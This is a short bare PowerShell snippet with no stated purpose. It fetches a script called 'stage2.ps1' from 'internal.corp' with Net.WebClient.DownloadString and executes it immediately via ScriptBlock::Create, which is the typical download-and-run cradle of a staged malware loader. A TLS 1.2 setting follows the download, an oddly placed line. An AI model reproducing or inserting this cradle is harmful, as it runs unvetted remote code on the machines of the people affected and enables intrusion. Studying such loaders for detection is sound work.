
$TransferUrl = 'https://internal.corp/stage2.ps1'
$DownloadedScript = (New-Object Net.WebClient).DownloadString($TransferUrl)
& ([ScriptBlock]::Create($DownloadedScript))
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
